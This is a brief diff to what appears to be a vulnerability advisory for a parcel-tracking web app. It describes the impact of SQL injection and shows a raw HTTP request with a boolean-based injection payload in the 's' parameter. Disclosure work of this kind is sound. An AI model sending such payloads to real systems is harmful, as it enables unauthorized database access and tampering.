@@ -19,7 +19,7 @@ index.php
 Attackers can use SQL injection to bypass the authentication and authorization mechanisms of web applications and retrieve the content of the entire database. SQLi can also be used to add, modify, and delete records in a database, thereby affecting data integrity. In appropriate cases, attackers can also use SQLi to execute operating system commands, which can then be used to launch further attacks.
 
 ```
-GET http://127.0.0.1/gaatitrack/?page=parcel_list&s=-1 or 3*2*1=6 and 1=1 --+ HTTP/1.1
+GET /gaatitrack/?page=parcel_list&s=-1 or 3*2*1=6 and 1=1 --+ HTTP/1.1
 Host: 127.0.0.1
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
